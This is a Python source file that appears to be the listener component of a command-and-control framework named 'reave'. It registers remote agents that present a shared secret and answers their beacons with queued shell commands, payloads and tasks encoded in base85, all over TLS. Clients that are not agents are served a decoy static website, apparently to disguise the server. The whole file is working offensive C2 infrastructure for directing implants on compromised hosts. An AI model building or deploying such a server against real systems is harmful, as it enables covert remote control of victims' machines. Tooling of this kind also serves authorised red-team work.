import socket
import uuid
import ssl
import threading
import logging
import time
import json
import base64
import configparser
from rich import print
from common.agent import Agent
from common.responses import serve_http
from common.protocol import Protocol


class Listener(object):
    """
    Listener class is responsible for handling, in a threaded manner,
    communications between the server and registered agents. It provides
    mechanisms for:

     - Registering agents
     - Responding to agent requests
     - Sending commands and payloads to agents
     - Receiving files from agents
     - Handling protocol messages as specified in protcol.py
    """

    def __init__(self, port, host, secret, agents, listeners, _keyboard_interrupt):
        self.uuid = uuid.uuid4()
        self.host = host
        self.port = port
        self.agents = agents
        self.listeners = listeners
        self.secret = secret
        self._keyboard_interrupt = _keyboard_interrupt

        self.logger = logging.getLogger(__name__)
        logging.debug(str(self.uuid) + " Listener spawned")

    def get_response(self, json_stub):
        """
        Provides the beaconing agent with a response. Current methods are
        stored in protocol.py. If the agent sends a response status that
        is not reflected in those methods, the listener will return an
        ERR_UNKNOWN_METHOD response.

        This will always update the lastseen time of the agent.
        """
        agent_uuid = json_stub["uuid"]
        response = json_stub["data"]
        status = json_stub["status"]

        for uuid, agent in self.agents.items():
            if uuid == agent_uuid and response:
                agent.update_lastseen()

        if status == "AGENT_ERROR":
            logging.error(agent_uuid + " AGENT_ERROR: " + response)
            print("[red]Error: " + response + "[/red]")
            return Protocol.ACK

        method = getattr(Protocol, json_stub["status"])
        if method:
            return method(json_stub)

        return Protocol.ERR_UNKNOWN_METHOD

    def associate_agent(self, json_stub):
        """
        Provides an initial method for associating an agent. If
        the agent has already been seen, this will update the
        agent's lastseen time.
        """
        agent_uuid = json_stub["uuid"]
        logging.debug(str(self.uuid) + " Associating agent with UUID: " + agent_uuid)

        # Check if the agent is already associated
        for uuid, agent in self.agents.items():
            if uuid == agent_uuid:
                logging.debug(
                    str(self.uuid) + " Agent already seen! Updating lastseen time."
                )
                agent.update_lastseen()
                return Protocol.ACK

        self.agents[agent_uuid] = Agent(
            self, agent_uuid, time.time(), json_stub["enumdata"]
        )
        logging.debug(str(self.uuid) + " Agent associated successfully.")
        return Protocol.ACK

    def handle_beacon(self, json_stub):
        """
        Handles an agent's beacon request. This method will always
        update an agent's last seen time. It will then query the
        agent for outstanding commands or payloads and send them
        encoded in base85.

        Pending commands will be sent with higher precedence than
        pending payloads. In the case that there are neither
        commands or payloads, these will be set to None.
        """
        agent_uuid = json_stub["uuid"]
        for uuid, agent in self.agents.items():
            if uuid == agent_uuid:
                agent.update_lastseen()
                command = agent.get_command()
                if command:
                    response_packet_stub = {
                        "status": "OK",
                        "command": base64.b85encode(command.encode()).decode(),
                        "payload": None,
                        "task": None,
                    }
                    cmd_pkt = "_response" + json.dumps(response_packet_stub)
                    return cmd_pkt.encode()

                payload = agent.get_payload()
                if payload:
                    response_packet_stub = {
                        "status": "OK",
                        "command": None,
                        "payload": base64.b85encode(payload.encode()).decode(),
                        "task": None,
                    }
                    cmd_pkt = "_response" + json.dumps(response_packet_stub)
                    return cmd_pkt.encode()

                task = agent.get_task()
                if task:
                    response_packet_stub = {
                        "status": "OK",
                        "command": None,
                        "payload": None,
                        "task": base64.b85encode(task.encode()).decode(),
                    }
                    cmd_pkt = "_response" + json.dumps(response_packet_stub)
                    return cmd_pkt.encode()

                response_packet_stub = {
                    "status": "OK",
                    "command": None,
                    "payload": None,
                    "task": None,
                }
                cmd_pkt = "_response" + json.dumps(response_packet_stub)
                return cmd_pkt.encode()

    def handle_proto_msg(self, proto_msg):
        """
        Method will parse incoming data and send proper agent messages
        to the appropriate handler. If the client is not an agent, it
        will serve a static website under reave/resource/www.
        """
        logging.debug(str(self.uuid) + " Handling protocol message: " + proto_msg)
        if "_associate" in proto_msg:
            try:
                json_stub = json.loads(proto_msg[10:])
            except:
                return False
            try:
                if json_stub["secret"] == self.secret:
                    return self.associate_agent(json_stub)
            except KeyError:
                return False
        elif "_beacon" in proto_msg:
            try:
                json_stub = json.loads(proto_msg[7:])
            except:
                return False
            try:
                if json_stub["secret"] == self.secret:
                    return self.handle_beacon(json_stub)
            except KeyError:
                return False
        elif "_response" in proto_msg:
            logging.debug(str(self.uuid) + " Handling response packet ")
            try:
                json_stub = json.loads(proto_msg[9:])
            except:
                return False
            try:
                if json_stub["secret"] == self.secret:
                    return self.get_response(json_stub)
            except KeyError:
                return False
        else:
            return serve_http(proto_msg)
        return

    def remove_from_list(self):
        self.listeners.remove(self)

    def main_thread(self):
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.sock.bind((self.host, self.port))
            self.sock.listen(5)
        except PermissionError:
            print("[red]Could not start listener: Permission Error[/red]")
            logging.debug("Could not start listener: Permission Error", exc_info=True)
            self.remove_from_list()
            return
        except OverflowError:
            print("[red]Could not start listener: Bad port range[/red]")
            logging.debug("Could not start listener: Bad port range", exc_info=True)
            self.remove_from_list()
            return
        except socket.gaierror:
            print(
                "[red]Could not start listener: No address associated with hostname[/red]"
            )
            logging.debug(
                "Could not start listener: No address associated with hostname",
                exc_info=True,
            )
            self.remove_from_list()
            return
        except OSError:
            print("[red]Could not start listener: Socket already bound[/red]")
            logging.debug(
                "Could not start listener: Socket already bound", exc_info=True
            )
            self.remove_from_list()
            return

        while not self._keyboard_interrupt.is_set():
            try:
                connection, address = self.sock.accept()
                context = ssl.SSLContext()
                context.minimum_version = ssl.TLSVersion.TLSv1_2
                context.verify_mode = ssl.CERT_OPTIONAL
                config = configparser.ConfigParser()
                config.read("reave/data/reave.conf")
                certificate_path = config["reave"]["cert_path"]
                context.load_cert_chain(certificate_path)
                wrapped_socket = context.wrap_socket(
                    connection, server_side=True, do_handshake_on_connect=False
                )
                wrapped_socket.settimeout(10)
                threading.Thread(
                    target=self.listenToClient, args=(wrapped_socket,)
                ).start()
            except socket.timeout:
                pass
            except ssl.SSLError:
                logging.debug(str(self.uuid) + " Listener SSL error.", exc_info=True)
                pass
        if self._keyboard_interrupt.is_set():
            logging.debug(str(self.uuid) + " Listener caught interrupt, closing socket")
            self.sock.close()

    def listenToClient(self, client):
        size = 16384
        while not self._keyboard_interrupt.is_set():
            try:
                data = client.recv(size)
                if data:
                    response = self.handle_proto_msg(data.decode())
                    if response:
                        client.send(response)
                else:
                    logging.debug(str(self.uuid) + " Client disconnect")
                    client.close()
                    return False
            except socket.timeout:
                logging.debug(str(self.uuid) + " Client timeout", exc_info=True)
                client.close()
                return False
            except ConnectionResetError:
                logging.debug(
                    str(self.uuid) + " Client closed connection.", exc_info=True
                )
                client.close()
                return False
            except ssl.SSLError:
                logging.debug(str(self.uuid) + " Listener SSL error.", exc_info=True)
                client.close()
                return False
        if self._keyboard_interrupt.is_set():
            logging.debug(str(self.uuid) + " Listener caught interrupt, closing client")
            client.close()
            return False
